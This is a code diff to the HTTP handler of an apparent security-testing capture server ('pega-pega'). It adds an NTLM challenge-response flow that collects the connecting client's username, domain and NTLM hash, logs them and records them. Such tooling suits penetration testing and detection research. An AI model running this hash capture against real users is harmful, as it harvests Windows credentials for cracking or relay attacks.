@@ -1,4 +1,5 @@
 import asyncio
+import base64
 import logging
 from urllib.parse import urlparse, parse_qs
 
@@ -7,6 +8,15 @@ from pathlib import Path
 from .base import BaseProtocolHandler
 from ..models import CapturedRequest, Protocol
 from ..utils.subdomain import extract_subdomain
+from ..utils.ntlm_parser import (
+    decode_ntlm_auth,
+    parse_ntlm_type,
+    parse_ntlm_type3,
+    build_ntlm_challenge,
+    generate_challenge,
+    NTLM_NEGOTIATE,
+    NTLM_AUTHENTICATE,
+)
 
 ACME_WEBROOT = Path("/tmp/pega-pega-acme")
 
@@ -29,6 +39,9 @@ class HttpHandler(BaseProtocolHandler):
     name = "HTTP"
     default_port = 80
     mock_matcher = None  # injected by server.py
+    def __init__(self, proto_config, global_config, bus):
+        super().__init__(proto_config, global_config, bus)
+        self._conn_challenges: dict[int, bytes] = {}  # writer id → server challenge
 
     # ------------------------------------------------------------------
     # Server lifecycle
@@ -115,7 +128,44 @@ class HttpHandler(BaseProtocolHandler):
                 if self.mock_matcher:
                     mock_rule = self.mock_matcher.match(method, parsed.path)
 
-                if mock_rule:
+                if mock_rule and mock_rule.get("ntlm_capture"):
+                    # NTLM handshake — connection-based multi-step auth
+                    auth_header = headers.get("authorization", "")
+                    ntlm_data = decode_ntlm_auth(auth_header) if auth_header else None
+                    ntlm_type = parse_ntlm_type(ntlm_data) if ntlm_data else None
+
+                    if ntlm_type == NTLM_NEGOTIATE:
+                        # Type 1 received — send Type 2 challenge
+                        ntlm_challenge = generate_challenge()
+                        # Store challenge on connection for Type 3 parsing
+                        self._conn_challenges[id(writer)] = ntlm_challenge
+                        challenge_b64 = base64.b64encode(
+                            build_ntlm_challenge(ntlm_challenge)
+                        ).decode()
+                        response_bytes = self._build_ntlm_challenge_response(
+                            version, challenge_b64
+                        )
+                    elif ntlm_type == NTLM_AUTHENTICATE:
+                        # Type 3 received — extract hash
+                        server_challenge = self._conn_challenges.pop(id(writer), b"\x00" * 8)
+                        result = parse_ntlm_type3(ntlm_data, server_challenge)
+                        if result:
+                            details["ntlm_hash"] = result["hash"]
+                            details["ntlm_user"] = result["user"]
+                            details["ntlm_domain"] = result["domain"]
+                            captured.details = details
+                            captured.summary = f"{method} {path} [NTLM: {result['user']}]"
+                            logger.info(
+                                "NTLM hash captured: %s from %s:%d",
+                                result["hash"], source_ip, source_port,
+                            )
+                            # Re-emit with NTLM details
+                            await self.emit(captured)
+                        response_bytes = self._build_mock_response(mock_rule, version)
+                    else:
+                        # No auth header — send initial 401
+                        response_bytes = self._build_ntlm_initial_response(version)
+                elif mock_rule:
                     logger.info("Mock rule matched: %s %s → rule %s", method, parsed.path, mock_rule.get("id", "?"))
                     response_bytes = self._build_mock_response(mock_rule, version)
                 else:
@@ -135,6 +185,7 @@ class HttpHandler(BaseProtocolHandler):
         except Exception:
             logger.debug("HTTP connection error from %s:%d", source_ip, source_port, exc_info=True)
         finally:
+            self._conn_challenges.pop(id(writer), None)
             try:
                 writer.close()
                 await writer.wait_closed()
@@ -355,6 +406,34 @@ class HttpHandler(BaseProtocolHandler):
             "\r\n"
         )
         return (status_line + headers).encode() + body
+
+    @staticmethod
+    def _build_ntlm_initial_response(version: str) -> bytes:
+        """401 response requesting NTLM auth (initial, no token)."""
+        body = b"<html><body><h1>401 Unauthorized</h1></body></html>"
+        return (
+            f"{version} 401 Unauthorized\r\n"
+            "WWW-Authenticate: NTLM\r\n"
+            "Content-Type: text/html\r\n"
+            f"Content-Length: {len(body)}\r\n"
+            "Connection: keep-alive\r\n"
+            "Server: pega-pega\r\n"
+            "\r\n"
+        ).encode() + body
+
+    @staticmethod
+    def _build_ntlm_challenge_response(version: str, challenge_b64: str) -> bytes:
+        """401 response with Type 2 NTLM challenge token."""
+        body = b"<html><body><h1>401 Unauthorized</h1></body></html>"
+        return (
+            f"{version} 401 Unauthorized\r\n"
+            f"WWW-Authenticate: NTLM {challenge_b64}\r\n"
+            "Content-Type: text/html\r\n"
+            f"Content-Length: {len(body)}\r\n"
+            "Connection: keep-alive\r\n"
+            "Server: pega-pega\r\n"
+            "\r\n"
+        ).encode() + body
 
     @staticmethod
     def _build_mock_response(rule: dict, version: str) -> bytes:
